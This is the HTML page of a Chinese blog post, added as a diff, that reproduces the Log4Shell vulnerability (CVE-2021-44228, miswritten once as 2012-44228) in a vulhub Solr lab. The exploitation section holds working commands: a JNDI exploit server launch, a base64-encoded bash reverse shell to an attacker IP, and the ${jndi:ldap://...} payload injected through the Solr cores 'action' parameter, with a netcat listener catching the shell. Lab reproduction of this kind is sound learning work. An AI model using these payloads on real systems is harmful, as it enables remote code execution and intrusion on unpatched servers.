@@ -1,0 +1,608 @@
+
+    <!DOCTYPE html>
+    <html lang="zh-CH"
+            
+          data-theme="dark"
+            
+    >
+    <head>
+    <meta charset="utf-8">
+    
+
+    
+
+    
+    <title>
+        log4j2 |
+        
+        sunian</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CUbuntu%20Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+    
+<link rel="stylesheet" href="https://unpkg.com/@fortawesome/fontawesome-free/css/v4-font-face.min.css">
+
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="Log4j2 的介绍Log4j2 是一个用于Java应用程序的强大日志记录库，旨在提供高性能、灵活性和可配置性的日志记录功能。Log4j 2 是 Apache Log4j 项目的一部分，是 Log4j 日志记录库的下一代版本。它是用于在应用程序中生成日志消息的工具，以便于开发人员能够监控、调试和分析应用程序的运行情况。 简单来说他有着 记录日志,  监控应用程序运行,  故障诊断,  性能分析,">
+<meta property="og:type" content="article">
+<meta property="og:title" content="log4j2">
+<meta property="og:url" content="https://blog.sunian.link/2023/08/07/log4j2/index.html">
+<meta property="og:site_name" content="sunian">
+<meta property="og:description" content="Log4j2 的介绍Log4j2 是一个用于Java应用程序的强大日志记录库，旨在提供高性能、灵活性和可配置性的日志记录功能。Log4j 2 是 Apache Log4j 项目的一部分，是 Log4j 日志记录库的下一代版本。它是用于在应用程序中生成日志消息的工具，以便于开发人员能够监控、调试和分析应用程序的运行情况。 简单来说他有着 记录日志,  监控应用程序运行,  故障诊断,  性能分析,">
+<meta property="og:locale" content="zh_CH">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/suniano/image/img/image-20230830202708227.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/suniano/image/img/image-20230830201310125.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/suniano/image/img/image-20230830195940858.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/suniano/image/img/image-20230830200113000.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/suniano/image/img/image-20230830202830366.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/suniano/image/img/image-20230830202917231.png">
+<meta property="article:published_time" content="2023-08-07T12:39:15.000Z">
+<meta property="article:modified_time" content="2023-08-30T12:45:35.077Z">
+<meta property="article:author" content="sunian">
+<meta property="article:tag" content="log4j2">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/suniano/image/img/image-20230830202708227.png">
+    
+        <link rel="alternate" href="/atom.xml" title="sunian" type="application/atom+xml">
+    
+    
+        <link rel="shortcut icon" href="/images/favicon.ico">
+    
+    
+        
+<link rel="stylesheet" href="https://unpkg.com/typeface-source-code-pro@1.1.13/index.css">
+
+    
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        
+<link rel="stylesheet" href="https://unpkg.com/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+
+    
+    
+    
+    
+    
+<script src="https://unpkg.com/pace-js@1.2.4/pace.min.js"></script>
+
+    
+        
+<link rel="stylesheet" href="https://unpkg.com/wowjs@1.1.3/css/libs/animate.css">
+
+        
+<script src="https://unpkg.com/wowjs@1.1.3/dist/wow.min.js"></script>
+
+        <script>
+          new WOW({
+            offset: 0,
+            mobile: true,
+            live: false
+          }).init();
+        </script>
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+    <body>
+    
+<div id='loader'>
+  <div class="loading-left-bg"></div>
+  <div class="loading-right-bg"></div>
+  <div class="spinner-box">
+    <div class="loading-taichi">
+      <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+      <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="#ff6e6b" />
+      <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z" fill="#fd0d00" />
+      <path d="M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95" fill="#fd0d00" />
+    </svg>
+    </div>
+    <div class="loading-word">我正在加载,等会啊...</div>
+  </div>
+</div>
+</div>
+
+<script>
+  const endLoading = function() {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loader').classList.add("loading");
+  }
+  window.addEventListener('load', endLoading);
+  document.getElementById('loader').addEventListener('click', endLoading);
+</script>
+
+
+    <div id="container">
+        <div id="wrap">
+            <header id="header">
+    
+        <img data-src="https://images.pexels.com/photos/745365/pexels-photo-745365.jpeg?auto=compress&amp;cs=tinysrgb&amp;w=600" data-sizes="auto" alt="log4j2" class="lazyload">
+    
+    <div id="header-outer" class="outer">
+        <div id="header-title" class="inner">
+            <div id="logo-wrap">
+                
+                    
+                    
+                        <a href="/" id="logo"><h1>log4j2</h1></a>
+                    
+                
+            </div>
+            
+                
+                
+            
+        </div>
+        <div id="header-inner">
+            <nav id="main-nav">
+                <a id="main-nav-toggle" class="nav-icon"></a>
+                
+                    <span class="main-nav-link-wrap">
+                        <span class="main-nav-icon"></span>
+                        <a class="main-nav-link" href="/">首页</a>
+                    </span>
+                
+                    <span class="main-nav-link-wrap">
+                        <span class="main-nav-icon"></span>
+                        <a class="main-nav-link" href="/archives">归档</a>
+                    </span>
+                
+                    <span class="main-nav-link-wrap">
+                        <span class="main-nav-icon"></span>
+                        <a class="main-nav-link" href="/friend">友链</a>
+                    </span>
+                
+                    <span class="main-nav-link-wrap">
+                        <span class="main-nav-icon"></span>
+                        <a class="main-nav-link" href="/about">关于</a>
+                    </span>
+                
+            </nav>
+            <nav id="sub-nav">
+                
+                    <a id="nav-rss-link" class="nav-icon" href="/atom.xml"
+                       title="RSS 订阅"></a>
+                
+                
+                    <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索">
+                    </a>
+                
+            </nav>
+            <div id="search-form-wrap">
+                <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://blog.sunian.link"></form>
+            </div>
+        </div>
+    </div>
+</header>
+
+            <div id="content" class="outer">
+                <section id="main"><article id="post-log4j2" class="h-entry article article-type-post"
+         itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <div class="article-inner">
+        <div class="article-meta">
+            <div class="article-date wow slideInLeft">
+    <a href="/2023/08/07/log4j2/" class="article-date-link">
+        <time datetime="2023-08-07T12:39:15.000Z"
+              itemprop="datePublished">2023-08-07</time>
+    </a>
+</div>
+
+            
+    <div class="article-category wow slideInLeft">
+        <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+    </div>
+
+
+        </div>
+        <div class="hr-line"></div>
+        
+
+        <div class="e-content article-entry" itemprop="articleBody">
+            
+                <h3 id="Log4j2-的介绍"><a href="#Log4j2-的介绍" class="headerlink" title="Log4j2 的介绍"></a>Log4j2 的介绍</h3><p>Log4j2 是一个用于Java应用程序的强大日志记录库，旨在提供高性能、灵活性和可配置性的日志记录功能。Log4j 2 是 Apache Log4j 项目的一部分，是 Log4j 日志记录库的下一代版本。它是用于在应用程序中生成日志消息的工具，以便于开发人员能够监控、调试和分析应用程序的运行情况。</p>
+<p>简单来说他有着 记录日志,  监控应用程序运行,  故障诊断,  性能分析,  合规性和安全性</p>
+<h3 id="Log4j2-漏洞产生"><a href="#Log4j2-漏洞产生" class="headerlink" title="Log4j2 漏洞产生"></a>Log4j2 漏洞产生</h3><p>${} 语法:  Log4j2 允许开发人员使用这个语法来调用一些系统的变量 . </p>
+<p><strong>代码例子:</strong> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;Configuration&gt;</span><br><span class="line">    &lt;Appenders&gt;</span><br><span class="line">        &lt;Console name=&quot;ConsoleAppender&quot; target=&quot;SYSTEM_OUT&quot;&gt;</span><br><span class="line">            &lt;PatternLayout pattern=&quot;%d&#123;HH:mm:ss.SSS&#125; $&#123;sys:a&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n&quot;/&gt;</span><br><span class="line">        &lt;/Console&gt;</span><br><span class="line">    &lt;/Appenders&gt;</span><br><span class="line">    &lt;Loggers&gt;</span><br><span class="line">        &lt;Root level=&quot;debug&quot;&gt;</span><br><span class="line">            &lt;AppenderRef ref=&quot;ConsoleAppender&quot;/&gt;</span><br><span class="line">        &lt;/Root&gt;</span><br><span class="line">    &lt;/Loggers&gt;</span><br><span class="line">&lt;/Configuration&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在上面的配置中，<code>$&#123;sys:a&#125;</code> 会被替换为系统变量 <code>a</code> 的值。<code>$&#123;sys:a&#125;</code> 是 Log4j2 特定语法，用于引入系统属性 <code>a</code> 的值。然后，<code>%d&#123;HH:mm:ss.SSS&#125;</code> 是日期格式，<code>[%t]</code> 是线程名，<code>%-5level</code> 是日志级别，<code>%logger&#123;36&#125;</code> 是类名（截断为最多 36 个字符），<code>%msg</code> 是日志消息本身。<code>%n</code> 是换行符。</p>
+<p>如果系统属性 <code>a</code> 的值是 <code>12345</code>，那么相应的日志消息将会是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">15:42:17.123 12345 [main] DEBUG com.example.MyApp - This is a debug message.</span><br></pre></td></tr></table></figure>
+
+<p><strong>通俗点来说:</strong> </p>
+<p>比如说有一条日志长这样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[main] DEBUG com.example.MyApp - This is a debug message.</span><br></pre></td></tr></table></figure>
+
+<p>利用 ${} 语法, 比如系统里面有个变量是 a &#x3D; 12345</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;sys:a&#125;[main] DEBUG com.example.MyApp - This is a debug message.   //这里用 $&#123;sys:&#125; 是引入变量的完整语法</span><br><span class="line">最后变成</span><br><span class="line">12345   [main] DEBUG com.example.MyApp - This is a debug message.</span><br></pre></td></tr></table></figure>
+
+<h3 id="Log4j2-语法利用"><a href="#Log4j2-语法利用" class="headerlink" title="Log4j2 语法利用"></a>Log4j2 语法利用</h3><p>这个语法不仅只有调用变量的功能, 还可以用 <code>$&#123;jndi:jndi://10.10.10.11/abc&#125;</code> 这个语法来加载远程的类并进行反序列化 </p>
+<p>所以需要启动一个JNDI 服务让Log4j2 进行远程加载调用</p>
+<p>这里可以用到工具 JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar </p>
+<h3 id="Log4j2-漏洞利用"><a href="#Log4j2-漏洞利用" class="headerlink" title="Log4j2 漏洞利用"></a>Log4j2 漏洞利用</h3><p>知道可以利用这个语法了, 那就得找一个可以被控制的利用点</p>
+<p>CVE-2021-44228漏洞产生的根本原因在于Log4j2在处理用户提供的输入时存在安全漏洞。具体来说，漏洞路径位于<code>/solr/admin/cores?action=</code>，这个路径实际上是Solr搜索引擎的管理接口，允许管理员对Solr实例中的核进行管理操作，如核的创建、删除、重载、重新加载等。</p>
+<p>漏洞的核心问题在于对输入参数<code>action</code>的处理。攻击者通过在<code>action</code>参数中传入<code>$&#123;&#125;</code>语法，利用Log4j2的解析机制来执行恶意代码。</p>
+<p>即是:  &#x2F;solr&#x2F;admin&#x2F;cores?action&#x3D;</p>
+<h3 id="Log4j2-漏洞复现"><a href="#Log4j2-漏洞复现" class="headerlink" title="Log4j2 漏洞复现"></a>Log4j2 漏洞复现</h3><p>这里用到的靶场为 vulhub  log4j2 CVE-2012-44228</p>
+<p>先启动 JDNI 服务  JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;要执行的命令&quot; -A 服务器地址</span><br><span class="line">如: java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;ping dnslog&quot; -A 192.168.6.5</span><br></pre></td></tr></table></figure>
+
+<p>制作反弹shell 命令 , 因为一些其他原因, 需要对 反弹shell 命令进行 base64 编码 ,再解码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash -i  &gt;&amp; /dev/tcp/192.168.57.129/8899 0&gt;&amp;1  base64 -&gt; YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTkyLjE2OC41Ny4xMjkvODg5OSAwPiYx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTkyLjE2OC41Ny4xMjkvODg5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
+
+<p>启动 JDNI 服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTkyLjE2OC41Ny4xMjkvODg5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A 192.168.57.129</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/suniano/image/img/image-20230830202708227.png" alt="image-20230830202708227">   </p>
+<p>启动 NC 监听</p>
+<p><img src="https://cdn.jsdelivr.net/gh/suniano/image/img/image-20230830201310125.png" alt="image-20230830201310125">    </p>
+<p>进入靶场</p>
+<p><img src="https://cdn.jsdelivr.net/gh/suniano/image/img/image-20230830195940858.png" alt="image-20230830195940858"> </p>
+<p>找到利用点 &#x2F;solr&#x2F;admin&#x2F;cores?action&#x3D; </p>
+<p><img src="https://cdn.jsdelivr.net/gh/suniano/image/img/image-20230830200113000.png" alt="image-20230830200113000"> </p>
+<p>url后拼接 payload </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://192.168.57.129:1389/w1t1db&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/suniano/image/img/image-20230830202830366.png" alt="image-20230830202830366"> </p>
+<p>最后nc 这个接收到反弹shell </p>
+<p><img src="https://cdn.jsdelivr.net/gh/suniano/image/img/image-20230830202917231.png" alt="image-20230830202917231"> </p>
+<p>到了最后, 我再想声明一下, 因为我的能力有限, 所以如果上面有不对的地方,可以提醒一下哈 ! </p>
+
+            
+        </div>
+        <footer class="article-footer">
+            <a data-url="https://blog.sunian.link/2023/08/07/log4j2/" data-id="cllxqei5r0007vstobp516cf9" data-title="log4j2"
+               class="article-share-link">分享</a>
+            
+                <a href="/2023/08/07/log4j2/#comments" class="article-comment-link">
+                    <span class="post-comments-count valine-comment-count" data-xid="/2023/08/07/log4j2/"
+                          itemprop="commentCount"></span>
+                    留言
+                </a>
+            
+            
+            
+            
+    <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/log4j2/" rel="tag">log4j2</a></li></ul>
+
+
+        </footer>
+    </div>
+    
+        
+    <nav id="article-nav" class="wow fadeInUp">
+        
+        
+            <div class="article-nav-link-wrap article-nav-link-right">
+                
+                    <img data-src="https://cdn.pixabay.com/photo/2014/12/27/15/33/office-581127_640.jpg" data-sizes="auto" alt="JAVA快速入门"
+                         class="lazyload">
+                
+                <a href="/2023/08/05/JAVA%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/"></a>
+                <div class="article-nav-caption">后一篇</div>
+                <h3 class="article-nav-title">
+                    
+                        JAVA快速入门
+                    
+                </h3>
+            </div>
+        
+    </nav>
+
+
+    
+</article>
+
+
+    <section id="comments" class="vcomment">
+
+    </section>
+
+
+
+
+
+
+
+
+
+
+</section>
+                
+                    <aside id="sidebar">
+    <div class="sidebar-wrap wow fadeInRight">
+        <div class="sidebar-author">
+            <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="sunian" class="lazyload">
+            <div class="sidebar-author-name">sunian</div>
+            <div class="sidebar-description"></div>
+        </div>
+        <div class="sidebar-state">
+            <div class="sidebar-state-article">
+                <div>文章</div>
+                <div class="sidebar-state-number">7</div>
+            </div>
+            <div class="sidebar-state-category">
+                <div>分类</div>
+                <div class="sidebar-state-number">4</div>
+            </div>
+            <div class="sidebar-state-tag">
+                <div>标签</div>
+                <div class="sidebar-state-number">7</div>
+            </div>
+        </div>
+        <div class="sidebar-social">
+            
+        </div>
+        <div class="sidebar-menu">
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">首页</div>
+                </div>
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/archives"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">归档</div>
+                </div>
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/friend"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">友链</div>
+                </div>
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/about"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">关于</div>
+                </div>
+            
+        </div>
+    </div>
+    
+        
+    <div class="widget-wrap wow fadeInRight">
+        <h3 class="widget-title">分类</h3>
+        <div class="widget">
+            <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/JAVA%E7%BC%96%E7%A8%8B/">JAVA编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/">靶场训练</a></li></ul>
+        </div>
+    </div>
+
+
+    
+        
+    <div class="widget-wrap wow fadeInRight">
+        <h3 class="widget-title">标签云</h3>
+        <div class="widget tagcloud">
+            <a href="/tags/Fastjson/" style="font-size: 10px;">Fastjson</a> <a href="/tags/JAVA/" style="font-size: 10px;">JAVA</a> <a href="/tags/buuctf-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-fakebook/" style="font-size: 10px;">buuctf 反序列化 fakebook</a> <a href="/tags/log4j2/" style="font-size: 10px;">log4j2</a> <a href="/tags/shell/" style="font-size: 10px;">shell</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">sql注入</a> <a href="/tags/%E6%A0%87%E7%AD%BE/" style="font-size: 10px;">标签</a>
+        </div>
+    </div>
+
+
+    
+        
+    <div class="widget-wrap wow fadeInRight">
+        <h3 class="widget-title">归档</h3>
+        <div class="widget">
+            <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li></ul>
+        </div>
+    </div>
+
+
+    
+</aside>
+
+                
+            </div>
+            <footer id="footer" class="wow fadeInUp">
+    <div style="width: 100%; overflow: hidden"><div class="footer-line"></div></div>
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            
+            <div>
+                <span class="icon-copyright"></span>
+                2020-2023
+                <span class="footer-info-sep"></span>
+                sunian
+            </div>
+            
+                <div>
+                    基于&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>&nbsp;
+                    Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" target="_blank">Reimu</a>
+                </div>
+            
+            
+                <div>
+                    <span class="icon-brush"></span>
+                    6.8k
+                    &nbsp;|&nbsp;
+                    <span class="icon-coffee"></span>
+                    00:27
+                </div>
+            
+            
+                <div>
+                    <span class="icon-eye"></span>
+                    <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+                    &nbsp;|&nbsp;
+                    <span class="icon-user"></span>
+                    <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+                </div>
+            
+        </div>
+    </div>
+</footer>
+
+        </div>
+        <nav id="mobile-nav">
+    <div class="sidebar-wrap">
+        <div class="sidebar-author">
+            <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="sunian" class="lazyload">
+            <div class="sidebar-author-name">sunian</div>
+            <div class="sidebar-description"></div>
+        </div>
+        <div class="sidebar-state">
+            <div class="sidebar-state-article">
+                <div>文章</div>
+                <div class="sidebar-state-number">7</div>
+            </div>
+            <div class="sidebar-state-category">
+                <div>分类</div>
+                <div class="sidebar-state-number">4</div>
+            </div>
+            <div class="sidebar-state-tag">
+                <div>标签</div>
+                <div class="sidebar-state-number">7</div>
+            </div>
+        </div>
+        <div class="sidebar-social">
+            
+        </div>
+        <div class="sidebar-menu">
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">首页</div>
+                </div>
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/archives"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">归档</div>
+                </div>
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/friend"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">友链</div>
+                </div>
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/about"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">关于</div>
+                </div>
+            
+        </div>
+    </div>
+</nav>
+
+        
+<script src="https://unpkg.com/jquery@3.7.0/dist/jquery.min.js"></script>
+
+
+<script src="https://unpkg.com/lazysizes@5.3.2/lazysizes.min.js"></script>
+
+
+<script src="https://unpkg.com/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+
+
+    
+<script src="https://unpkg.com/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+
+
+    
+<script src="https://unpkg.com/busuanzi@2.3.0/bsz.pure.mini.js"></script>
+
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+    
+<script src="https://unpkg.com/valine@1.5.1/dist/Valine.min.js"></script>
+
+    <script>
+        var GUEST_INFO = ['nick', 'mail', 'link'];
+        var guest_info = 'nick,mail,link'.split(',').filter(function (item) {
+            return GUEST_INFO.indexOf(item) > -1
+        });
+        var recordIP = JSON.parse('true');
+        var highlight = JSON.parse('true');
+
+        new Valine({
+            el: '.vcomment',
+            appId: "8wzd3FXAMGg7g8bFp0j1KwjG-gzGzoHsz",
+            appKey: "Pzljz7xBdDuOuGJrGDNxaRfx",
+            placeholder: "Just go go",
+            pageSize: '10',
+            avatar: 'mp',
+            lang: 'zh-cn',
+            recordIP: recordIP,
+            highlight: highlight
+        });
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="https://unpkg.com/algoliasearch@4.17.1/dist/algoliasearch-lite.umd.js"></script>
+
+    
+<script src="https://unpkg.com/instantsearch.js@4.56.1/dist/instantsearch.production.min.js"></script>
+
+    
+<script src="/js/search.js"></script>
+
+    <script>
+        var CONFIG = {
+            root: '/',
+            algolia: {
+                applicationID: "KO5F235PY0",
+                apiKey: "5269ceef15fede8888604ab73989f369",
+                indexName: "suniano",
+                hits: {
+                    "per_page": parseInt("10")
+                },
+                labels: {
+                    "input_placeholder": "搜索.....",
+                    "hits_empty": "未发现与 「${query}」相关内容",
+                    "hits_stats": "找到${hits}条结果（用时 ${time} ms）"
+                }
+            }
+        };
+    </script>
+
+
+    </div>
+    <div class="site-search">
+        <div class="algolia-popup popup">
+            <div class="algolia-search">
+                <span class="algolia-search-input-icon"></span>
+                <div class="algolia-search-input" id="algolia-search-input"></div>
+            </div>
+
+            <div class="algolia-results">
+                <div id="algolia-stats"></div>
+                <div id="algolia-hits"></div>
+                <div id="algolia-pagination" class="algolia-pagination"></div>
+            </div>
+
+            <span class="popup-btn-close"></span>
+        </div>
+    </div>
+    <!-- hexo injector body_end start -->
+<script src="/js/insertHighlight.js"></script>
+<!-- hexo injector body_end end --></body>
+    </html>
+
